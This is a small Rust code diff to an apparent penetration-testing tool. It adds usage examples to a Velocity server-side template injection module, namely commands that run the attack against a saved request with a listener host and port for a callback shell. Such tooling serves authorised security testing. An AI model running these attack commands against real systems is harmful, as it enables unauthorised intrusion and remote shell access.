@@ -60,6 +60,10 @@ impl WebModule for VelocityModule {
                 "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#velocity".to_string(),
                 "https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#velocity-java".to_string(),
             ],
+            examples: vec![
+                "cap web run --module web/ssti/velocity --request ./requests/api.req --injection-point data --lhost 10.10.14.5 --lport 4444".to_string(),
+                "cap web run --module web/ssti/velocity --request ./requests/api.req --injection-point data --lhost 10.10.14.5 --lport 4444 --dry-run".to_string(),
+            ],
         }
     }
     
